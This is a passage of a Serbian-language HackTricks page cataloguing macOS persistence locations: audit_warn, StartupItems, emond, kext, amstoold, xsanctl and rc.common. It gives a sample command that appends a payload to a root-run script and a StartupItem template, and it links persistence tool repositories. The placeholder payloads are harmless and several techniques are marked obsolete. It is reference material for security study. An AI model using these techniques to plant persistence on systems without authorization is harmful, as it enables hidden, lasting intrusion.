Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root, auditd mora biti pokrenut i izazvati upozorenje
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/etc/security/audit_warn`**
* Potreban je root pristup
* **Okidač**: Kada auditd otkrije upozorenje

#### Opis i eksploatacija

Kada auditd otkrije upozorenje, izvršava se skripta **`/etc/security/audit_warn`**. Možete dodati svoj payload u nju.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Možete izazvati upozorenje sa `sudo audit -n`.

### Pokretanje stavki

{% hint style="danger" %}
**Ovo je zastarelo, tako da ništa ne bi trebalo biti pronađeno u tim direktorijumima.**
{% endhint %}

**StartupItem** je direktorijum koji treba da se nalazi ili u `/Library/StartupItems/` ili u `/System/Library/StartupItems/`. Kada se ovaj direktorijum uspostavi, mora da sadrži dva specifična fajla:

1. **rc skript**: Shell skripta koja se izvršava pri pokretanju.
2. **plist fajl**, tačno nazvan `StartupParameters.plist`, koji sadrži različite konfiguracione postavke.

Proverite da su i rc skripta i `StartupParameters.plist` fajl pravilno smešteni unutar direktorijuma **StartupItem** kako bi proces pokretanja mogao da ih prepozna i koristi.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="superservicename" %}superimeusluge
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Ne mogu da pronađem ovu komponentu na mom macOS-u, pa za više informacija pogledajte writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Predstavljen od strane Apple-a, **emond** je mehanizam za beleženje koji izgleda nedovoljno razvijen ili možda napušten, ali i dalje je dostupan. Iako nije posebno koristan za administratora Mac-a, ovaj skriveni servis može služiti kao suptilan način upornosti za napadače, verovatno neprimećen od strane većine macOS administratora.

Za one koji su svesni njegovog postojanja, identifikacija bilo kakve zlonamerne upotrebe **emond**-a je jednostavna. LaunchDaemon sistema za ovaj servis traži skripte za izvršavanje u jednom direktorijumu. Da biste to proverili, možete koristiti sledeću komandu:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Lokacija

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Potreban je root pristup
* **Okidač**: Sa XQuartz

#### Opis i Exploit

XQuartz **više nije instaliran u macOS-u**, pa ako želite više informacija pogledajte writeup.

### ~~kext~~

{% hint style="danger" %}
Veoma je komplikovano instalirati kext čak i kao root, tako da neću smatrati ovo kao bekstvo iz sandboxa ili čak za postojanost (osim ako imate exploit)
{% endhint %}

#### Lokacija

Da biste instalirali KEXT kao stavku za pokretanje, potrebno je da bude **instaliran na jednoj od sledećih lokacija**:

* `/System/Library/Extensions`
* KEXT fajlovi ugrađeni u OS X operativni sistem.
* `/Library/Extensions`
* KEXT fajlovi instalirani od strane softvera trećih lica

Možete prikazati trenutno učitane kext fajlove sa:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Za više informacija o [**kernel ekstenzijama pogledajte ovu sekciju**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Opis: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Lokacija

* **`/usr/local/bin/amstoold`**
* Potreban je root pristup

#### Opis i iskorišćavanje

Navodno je `plist` fajl sa lokacije `/System/Library/LaunchAgents/com.apple.amstoold.plist` koristio ovaj binarni fajl dok je izlagao XPC servis... problem je što binarni fajl nije postojao, pa ste mogli da stavite nešto tamo i kada se pozove XPC servis, vaš binarni fajl će biti pozvan.

Više ne mogu da pronađem ovo na mom macOS-u.

### ~~xsanctl~~

Opis: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Lokacija

* **`/Library/Preferences/Xsan/.xsanrc`**
* Potreban je root pristup
* **Okidač**: Kada se pokrene servis (retko)

#### Opis i iskorišćavanje

Navodno nije često da se pokreće ovaj skript i čak ga nisam mogao pronaći na mom macOS-u, pa ako želite više informacija pogledajte opis.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Ovo ne funkcioniše u modernim verzijama MacOS-a**
{% endhint %}

Takođe je moguće ovde postaviti **komande koje će se izvršiti pri pokretanju sistema.** Primer redovnog rc.common skripta:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Tehnike i alati za postojanost

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
